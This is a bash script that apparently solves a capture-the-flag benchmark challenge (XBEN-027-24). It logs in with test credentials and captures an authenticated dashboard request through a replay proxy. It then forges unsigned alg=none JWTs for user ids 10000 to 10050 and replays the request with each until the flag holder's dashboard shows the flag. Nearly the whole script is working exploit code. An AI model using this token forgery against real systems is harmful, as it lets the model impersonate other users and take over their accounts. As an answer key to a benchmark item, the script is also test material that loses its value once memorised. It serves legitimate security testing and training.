#!/usr/bin/env bash
# XBEN-027-24 — JWT with an unverified signature (alg=none accepted). Proxy-mode
# twin. Log in for a real session, capture an authenticated /dashboard request,
# then replay THAT request (keeping its session cookie) with an unsigned token
# minted for each candidate user id. The flag holder's dashboard renders the
# flag; no key is needed because the signature is never checked.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben027p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/"; BASE="$(req_of GET /)"
# 1. Log in (test/test) so the session jar holds a real cookie.
"$H5I" websec replay "$BASE" --create --session "$SESSION" --as "$SESSION" \
  --set 'method=POST' --set 'path=/password/test' --set 'form.password=test' >/dev/null
# 2. Capture an authenticated /dashboard request to replay against. `--as` carries
#    the session cookie the login put in the jar, so the stored request is
#    authenticated; the forge step below then overrides only auth_token.
dash="$("$H5I" websec replay "$BASE" --create --json --session "$SESSION" --as "$SESSION" \
  --set 'method=GET' --set 'path=/dashboard' 2>/dev/null | python3 -c 'import json,sys; print(json.load(sys.stdin)["request_id"])')"
# 3. Replay that request with an unsigned token per candidate id; the flag
#    holder's dashboard carries the flag.
for uid in $(seq 10000 10050); do
  tok="$(python3 -I -c "import base64,json;b=lambda x:base64.urlsafe_b64encode(x).rstrip(b'=').decode();print(b(json.dumps({'alg':'none','typ':'JWT'}).encode())+'.'+b(json.dumps({'username':'x','user_id':$uid,'user_type':'customer'}).encode())+'.')")"
  "$H5I" websec replay "$dash" --reset-budget --session "$SESSION" --set "cookie.auth_token=$tok" >/dev/null 2>&1 || true
done
print_flag
